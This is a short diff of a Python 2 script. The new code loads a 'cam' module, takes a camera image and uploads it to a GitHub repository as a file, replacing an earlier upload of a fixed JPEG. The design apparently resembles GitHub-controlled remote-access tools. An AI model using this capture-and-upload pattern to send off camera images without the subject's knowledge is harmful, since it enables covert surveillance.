@@ -36,15 +36,14 @@ def load_module(name):
 	return module
 
 
-def send():
+def send(img):
 	gh,repo,branch = connect_to_github()
-	f = open('bean.jpeg','r')
+	#f = open('bean.jpeg','r')
 #	repo.create_file("data/mrbean64.jpeg","add a file",base64.b64encode(f.read()))
-	repo.create_file("data/mrbean.jpeg","add a file",f.read())
+	repo.create_file("data/ggg.jpeg","fst image",img)
 
-#send()
-#cam = load_module("cam")
-while True:
-#	cam.snap()
-	print "ddd"
-	time.sleep(1)
+cam = load_module("cam")
+
+img = cam.snap()
+send(img)
+#time.sleep(1)
